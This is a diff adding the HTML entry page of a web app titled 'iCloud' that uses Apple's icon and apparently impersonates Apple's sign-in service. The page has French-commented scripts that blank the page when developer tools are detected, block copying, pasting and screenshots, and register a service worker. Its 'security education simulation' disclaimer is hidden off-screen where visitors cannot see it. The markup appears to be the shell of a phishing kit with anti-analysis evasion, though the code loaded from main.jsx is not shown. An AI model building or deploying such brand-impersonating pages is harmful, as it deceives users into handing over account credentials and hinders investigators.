@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en" data-env="production">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' http://localhost:3333; font-src 'self'; frame-ancestors 'none';">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <link rel="icon" type="image/svg+xml" href="/apple_icon.ico" />
+    <link rel="apple-touch-icon" href="/apple_icon.ico">
+    <title>iCloud</title>
+
+    <script>
+      // Protection anti-inspection et anti-capture
+      document.addEventListener('DOMContentLoaded', () => {
+        // Détection DevTools
+        setInterval(() => {
+          const threshold = 150;
+          if(window.outerWidth - window.innerWidth > threshold || 
+             window.outerHeight - window.innerHeight > threshold) {
+            document.body.innerHTML = '<div style="padding:20px;text-align:center;color:red;">Security Violation Detected</div>';
+          }
+        }, 500);
+
+        // Blocage des captures d'écran
+        document.addEventListener('keydown', (e) => {
+          if(e.key === 'PrintScreen' || (e.ctrlKey && e.key === 'p')) {
+            e.preventDefault();
+            alert('Screenshots are disabled for security reasons');
+          }
+        });
+
+        // Protection contre la copie
+        document.addEventListener('copy', (e) => e.preventDefault());
+        document.addEventListener('cut', (e) => e.preventDefault());
+        document.addEventListener('paste', (e) => e.preventDefault());
+      });
+
+      // Service Worker pour sécurité offline
+      if('serviceWorker' in navigator && location.hostname !== 'localhost') {
+        navigator.serviceWorker.register('/sw.js')
+          .then(reg => console.log('SW registered'))
+          .catch(err => console.error('SW registration failed'));
+      }
+    </script>
+  </head>
+  <body style="margin:0;overflow-x:hidden;">
+    <noscript>
+      <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:9999;display:flex;justify-content:center;align-items:center;">
+        <div style="text-align:center;max-width:500px;padding:20px;">
+          <h1>JavaScript Required</h1>
+          <p>This application requires JavaScript to function properly.</p>
+          <p>Please enable JavaScript in your browser settings.</p>
+        </div>
+      </div>
+    </noscript>
+
+    <div id="root"></div>
+    
+    <!-- Avertissement légal caché -->
+    <div style="position:absolute;left:-9999px;top:-9999px;">
+      <p>This is a security education simulation only. Not for malicious use.</p>
+    </div>
+
+    <script type="module" src="/src/main.jsx"></script>
+    
+    <!-- Fallback pour les vieux navigateurs -->
+    <script>
+      if(!window.Promise || !window.fetch || !window.Proxy) {
+        document.body.innerHTML = '<div style="padding:20px;text-align:center;">Your browser is not supported. Please use a modern browser.</div>';
+      }
+    </script>
+  </body>
+</html>
